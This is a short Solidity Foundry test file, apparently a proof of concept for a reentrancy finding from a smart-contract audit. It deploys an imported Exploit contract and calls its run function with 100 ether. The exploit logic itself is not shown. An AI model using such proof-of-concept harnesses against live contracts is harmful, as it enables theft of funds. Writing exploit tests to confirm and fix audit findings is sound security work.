// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./65093-h-06-reentrancy-in-function.sol";

contract PoC is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        vm.deal(address(e), 0); // clean
        e.run{value: 100 ether}();
    }
}
